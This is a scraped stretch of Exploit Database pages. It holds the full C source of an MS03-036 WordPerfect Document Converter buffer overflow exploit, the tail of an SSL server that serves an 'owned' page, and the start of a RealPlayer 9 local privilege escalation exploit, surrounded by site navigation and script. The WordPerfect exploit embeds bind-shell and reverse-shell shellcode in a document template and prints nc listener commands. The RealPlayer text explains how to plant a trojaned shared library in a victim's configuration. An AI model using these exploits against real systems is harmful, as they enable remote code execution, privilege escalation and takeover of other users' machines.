&read_mask, NULL, NULL, 0 )== -1)continue;fd = accept(descr, &remote, &len);if (fd >=0) {char obuf[4096];if ((ssl = SSL_new (ctx)) != NULL) {SSL_set_fd (ssl, fd);SSL_set_accept_state(ssl);if ((SSL_accept (ssl)) == -1)exit(1);strcpy(obuf, "HTTP/1.0 200 OK\n");strcat(obuf, "Content-Length: 40\n");strcat(obuf, "Content-Type:text/html\n\n");strcat(obuf, "<html><body>You'reowned!</body></html>");SSL_write (ssl, obuf, strlen(obuf));SSL_set_shutdown(ssl,SSL_SENT_SHUTDOWN|SSL_RECEIVED_SHUTDOWN);SSL_free (ssl);ERR_remove_state(0);}close(fd);}}SSL_CTX_free (ctx);  /* Never gets called */}static void ssl_init(void){SSL_load_error_strings();SSLeay_add_ssl_algorithms();meth = SSLv23_server_method();ctx = SSL_CTX_new (meth);if (!ctx)exit(1);if (SSL_CTX_use_certificate_file(ctx, CERTF,SSL_FILETYPE_PEM) <= 0)exit(1);if (SSL_CTX_use_PrivateKey_file(ctx, KEYF,SSL_FILETYPE_PEM) <= 0)exit(1);if (!SSL_CTX_check_private_key(ctx))exit(1);}// milw0rm.com [2003-09-05]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 92
Microsoft WordPerfect Document Converter (Windows NT4 Workstation SP5/SP6 French) - File Template Buffer Overflow (MS03-036) - Windows remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDMicrosoft WordPerfect Document Converter (Windows NT4 Workstation SP5/SP6 French) - File Template Buffer Overflow (MS03-036)EDB-ID:92CVE:2003-0666EDB Verified:Author:valgasuType:remoteExploit:/Platform:WindowsDate:2003-09-06Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/******************************************************************//*   Microsoft WordPerfect Document Converter Buffer Overflow Exploit MS03-036    *//*                                                                                                                *//*                                  Exploit with several targets                                         *//*                                                                                                                *//*        Find your own return address with :                                                       *//*            findhex dllname FF D4 (call esp)                                                      *//*            findhex dllname FF E4 (jmp esp)                                                      *//*                                                                                                                *//* Credits :                                                                                                   *//* vulnerability : Yuji "The Ninja" Ukai                                                              *//* findhex : Jason Jordan                                                                               *//* sk scan-associates.net                                                                               *//* shellcode : metasploit                                                                                *//* exploit : valgasu - RstAck                                                                           *//*                                                                                                                *//******************************************************************/#include <stdio.h>#include <stdlib.h>#include <malloc.h>#include <windows.h>#pragma comment(lib,"ws2_32")/* eip offset for Word 2000 9.0.2812 */#define EIP_OFFSET 1359/* eip offset for Word 2000 9.0.4462 SR1 *///#define EIP_OFFSET 1343void usage(char *name){printf("\n-- --\n");printf("-- WordPerfect Document Converter Exploit --\n");printf("-- --\n\n");printf("Usage: %s <shell type> <template doc> <os> <port> [<ip>]\n\n", name);printf("Shell type : 1 - Bind shell (need port)\n");printf(" 2 - Reverse shell (need ip and port)\n\n");printf("OS : 1 - Windows 2000 Pro SP3 French\n");printf(" 2 - Windows NT4 Workstation SP5 French\n");printf(" 3 - Windows NT4 Workstation SP6 French\n");exit(1);}int main(int argc, char *argv[]){unsigned char bindshell[] ="\x66\x81\xec\x80\x00\x89\xe6\xe8\x4b\x01\x00\x00\x89\x06\xff\x36""\x68\x8e\x4e\x0e\xec\xe8\x52\x01\x00\x00\x89\x46\x08\xff\x36\x68""\xad\xd9\x05\xce\xe8\x43\x01\x00\x00\x89\x46\x0c\x68\x6c\x6c\x00""\x00\x68\x33\x32\x2e\x64\x68\x77\x73\x32\x5f\x54\xff\x56\x08\x89""\x46\x04\xff\x36\x68\x72\xfe\xb3\x16\xe8\x1e\x01\x00\x00\x89\x46""\x10\xff\x36\x68\xef\xce\xe0\x60\xe8\x0f\x01\x00\x00\x89\x46\x14""\xff\x76\x04\x68\xcb\xed\xfc\x3b\xe8\xff\x00\x00\x00\x89\x46\x18""\xff\x76\x04\x68\xd9\x09\xf5\xad\xe8\xef\x00\x00\x00\x89\x46\x1c""\xff\x76\x04\x68\xa4\x1a\x70\xc7\xe8\xdf\x00\x00\x00\x89\x46\x20""\xff\x76\x04\x68\xa4\xad\x2e\xe9\xe8\xcf\x00\x00\x00\x89\x46\x24""\xff\x76\x04\x68\xe5\x49\x86\x49\xe8\xbf\x00\x00\x00\x89\x46\x28""\xff\x76\x04\x68\xe7\x79\xc6\x79\xe8\xaf\x00\x00\x00\x89\x46\x2c""\x31\xff\x81\xec\x90\x01\x00\x00\x54\x68\x01\x01\x00\x00\xff\x56""\x18\x50\x50\x50\x50\x40\x50\x40\x50\xff\x56\x1c\x89\xc3\x57\x57""\x68\x02\x00\x22\x11\x89\xe1\x68\x16\x00\x00\x00\x51\x53\xff\x56""\x20\x57\x53\xff\x56\x24\x57\x51\x53\xff\x56\x28\x89\xc2\x68\x65""\x78\x65\x00\x68\x63\x6d\x64\x2e\x89\x66\x30\x81\xc4\xac\xff\xff""\xff\x8d\x3c\x24\x31\xc0\x31\xc9\x80\xc1\x15\xab\xe2\xfd\xc6\x44""\x24\x10\x44\xfe\x44\x24\x3d\x89\x54\x24\x48\x89\x54\x24\x4c\x89""\x54\x24\x50\x8d\x44\x24\x10\x54\x50\x51\x51\x51\x41\x51\x49\x51""\x51\xff\x76\x30\x51\xff\x56\x10\x89\xe1\x68\xff\xff\xff\xff\xff""\x31\x89\xc1\x57\xff\x56\x14\x56\x64\xa1\x30\x00\x00\x00\x8b\x40""\x0c\x8b\x70\x1c\xad\x8b\x40\x08\x5e\xc2\x04\x00\x53\x55\x56\x57""\x8b\x6c\x24\x18\x8b\x45\x3c\x8b\x54\x05\x78\x01\xea\x8b\x4a\x18""\x8b\x5a\x20\x01\xeb\xe3\x32\x49\x8b\x34\x8b\x01\xee\x31\xff\xfc""\x31\xc0\xac\x38\xe0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf2\x3b\x7c""\x24\x14\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c""\x01\xeb\x8b\x04\x8b\x01\xe8\xeb\x02\x31\xc0\x89\xea\x5f\x5e\x5d""\x5b\xc2\x04\x00";char revshell[] ="\x66\x81\xec\x80\x00\x89\xe6\xe8\x10\x01\x00\x00\x89\x06\xff\x36""\x68\x8e\x4e\x0e\xec\xe8\x17\x01\x00\x00\x89\x46\x08\xff\x36\x68""\xad\xd9\x05\xce\xe8\x08\x01\x00\x00\x89\x46\x0c\x68\x6c\x6c\x00""\x00\x68\x33\x32\x2e\x64\x68\x77\x73\x32\x5f\x54\xff\x56\x08\x89""\x46\x04\xff\x36\x68\x72\xfe\xb3\x16\xe8\xe3\x00\x00\x00\x89\x46""\x10\xff\x36\x68\x7e\xd8\xe2\x73\xe8\xd4\x00\x00\x00\x89\x46\x14""\xff\x76\x04\x68\xcb\xed\xfc\x3b\xe8\xc4\x00\x00\x00\x89\x46\x18""\xff\x76\x04\x68\xd9\x09\xf5\xad\xe8\xb4\x00\x00\x00\x89\x46\x1c""\xff\x76\x04\x68\xec\xf9\xaa\x60\xe8\xa4\x00\x00\x00\x89\x46\x20""\x81\xec\x90\x01\x00\x00\x54\x68\x01\x01\x00\x00\xff\x56\x18\x50""\x50\x50\x50\x40\x50\x40\x50\xff\x56\x1c\x89\xc3\xeb\x03\xff\x56""\x14\x68\xc0\xa8\x00\xf7\x68\x02\x00\x22\x11\x89\xe1\x6a\x10\x51""\x53\xff\x56\x20\x85\xc0\x75\xe6\x68\x63\x6d\x64\x00\x89\x66\x30""\x81\xc4\xac\xff\xff\xff\x8d\x3c\x24\x31\xc0\x31\xc9\x80\xe9\xeb""\xab\xe2\xfd\xc6\x44\x24\x10\x44\xfe\x44\x24\x3d\x89\x5c\x24\x48""\x89\x5c\x24\x4c\x89\x5c\x24\x50\x8d\x44\x24\x10\x54\x50\x51\x51""\x51\x6a\x01\x51\x51\xff\x76\x30\x51\xff\x56\x10\x89\xe1\x68\xff""\xff\xff\xff\xff\x31\xff\x56\x0c\x89\xc1\xeb\x92\x56\x64\xa1\x30""\x00\x00\x00\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x40\x08\x5e\xc2\x04""\x00\x53\x55\x56\x57\x8b\x6c\x24\x18\x8b\x45\x3c\x8b\x54\x05\x78""\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x32\x49\x8b\x34\x8b""\x01\xee\x31\xff\xfc\x31\xc0\xac\x38\xe0\x74\x07\xc1\xcf\x0d\x01""\xc7\xeb\xf2\x3b\x7c\x24\x14\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b""\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\xeb\x02\x31\xc0""\x89\xea\x5f\x5e\x5d\x5b\xc2\x04\x00";FILE *docfile;unsigned short port;const char *eip;char targetos[255];int i;int bshell;if (argc <5) {usage(argv[0]);}printf("\n-- --\n");printf("-- WordPerfect Document Converter Exploit --\n");printf("-- --\n\n");/* Shell type */switch(atoi(argv[1])) {case 1 : printf("-- Shell type : bind shell\n");bshell = 1;break;case 2 : printf("-- Shell type : reverse shell\n");bshell = 0;break;default : printf("-- Shell type : unknown\n");exit(1);}/* Open template file */if( (docfile = fopen(argv[2], "r+b")) == NULL) {printf("-- Can't open file %s\n", argv[2]);exit(1);}else {printf("-- Template file : \"%s\"\n", argv[2]);}/* Customize shellcode */port = htons(atoi(argv[4]));if(bshell) {*(unsigned short *)&bindshell[227] = port;printf("-- Port : %d\n", atoi(argv[4]));}else {*(unsigned short *)&revshell[185] = port;printf("-- Port : %d\n", atoi(argv[4]));*(unsigned int *)&revshell[178] = inet_addr(argv[5]);printf("-- IP : %s\n", argv[5]);}/* Set the return address */switch(atoi(argv[3])) {// Windows 2000 Pro SP3 - Frenchcase 1 : sprintf(targetos, "Windows 2000 Pro SP3 - French");eip = "\xA7\x88\xE2\x77";break;// Windows NT4 Workstation SP5 - Frenchcase 2 : sprintf(targetos, "Windows NT4 Workstation SP5 - French");eip = "\x10\x45\xEB\x77";break;// Windows NT4 Workstation SP6 - Frenchcase 3 : sprintf(targetos, "Windows NT4 Workstation SP6 - French");eip = "\x36\x28\xF3\x77";break;// Add your own return address heredefault : printf("-- Target OS : unknown\n");exit(1);}printf("-- Target OS : %s\n", targetos);fseek(docfile, EIP_OFFSET, SEEK_SET);fwrite(eip, sizeof(eip), 1, docfile);// Put some nopfor (i=0;i<24;i++) {fseek(docfile, EIP_OFFSET + 4 + i, SEEK_SET);fwrite("\x90", sizeof(char), 1, docfile);}// Put our shellcodefseek(docfile, EIP_OFFSET + 28, SEEK_SET);if(bshell) {fwrite(bindshell, sizeof(bindshell), 1, docfile);}else {fwrite(revshell, sizeof(revshell), 1, docfile);}fclose(docfile);printf("-- Status : template file modified\n");if(bshell) {printf("-- After document execution : nc <ip> %d\n", atoi(argv[4]));}else {printf("-- Before document execution : nc -l -p %d\n", atoi(argv[4]));}return 0;}// milw0rm.com [2003-09-06]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 93
RealPlayer 9 *nix - Local Privilege Escalation - Linux local Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDRealPlayer 9 *nix - Local Privilege EscalationEDB-ID:93CVE:EDB Verified:Author:Jon HartType:localExploit:/Platform:LinuxDate:2003-09-09Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/*** rp9-priv-esc.c** A local privilege escalation attack against the community supported* version of Real.com's Realplayer, version 9.** Written by:** 	Jon Hart warchild spoofed.org** By default, configuration files are stored in ~$USER/.realnetworks/,* but all the files in there are group writeable.  So long as ~$USER* has group execution permissions (which is pretty common), a malicious* local user can edit the config files of fellow users to do his biddings.** There are a number of ways to attack this, but after some poking it seems* that modifying the path to shared libraries and writing my own malicious* shared libraries was the easiest.** (as an aside, just because the shared libraries in the directories contained* in ~$USER/.realnetworks/RealShared_0_0/ are stripped doesn't mean we can't get* the symbols back.  objdump quickly can tell us what the names of the 15* functions are, and we can stub out a bogus shared library pretty quickly.)** This particular bit of code is meant to replace the shared library* cook.so.6.0, which is contained in the Codecs directory.  To execute this* attack against a fellow local user, first edit their config file* (~victim/.realnetworks/RealShared_0_0) to have the 'dt_codecs' variable* point to a directory under your control, like /tmp/Codecs.  Copy all of the* existing files from the previous value of dt_codecs (which is usually something* like ~victim/Real/Codecs/) to /tmp/Codecs.  Next, compile the code below as a* shared library and copy it to the trojaned directory:*** `gcc -shared -fPIC -o /tmp/Codecs/cook.so.6.0 rp9-priv-esc.c`**	The next time the victim fires up realplayer 9, a nice little shell* will be listening on port 12345 for you:** guest@haiti:/$ id* uid=1006(guest) gid=100(users) groups=100(users)* guest@haiti:/$ nc localhost 12345* id* uid=1000(warchild) gid=100(users) groups=100(users),40(src),1003(wheel)** Of course, you don't have to execute a shell.  Do whatever makes you happy.** Fix?  `chmod 700 ~/.realnetworks/*`**  Copyright (c) 2003, Jon Hart* All rights reserved.**  Redistribution and use in source and binary forms, with or without modification,*  are permitted provided that the following conditions are met:**  * Redistributions of source code must retain the above copyright notice,*    this list of conditions and the following disclaimer.*  * Redistributions in binary form must reproduce the above copyright notice,*    this list of conditions and the following disclaimer in the documentation*    and/or other materials provided with the distribution.*  * Neither the name of the organization nor the names of its contributors may*    be used to endorse or promote products derived from this software without*    specific prior written permission.***  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"*  AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE*  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE*  ARE 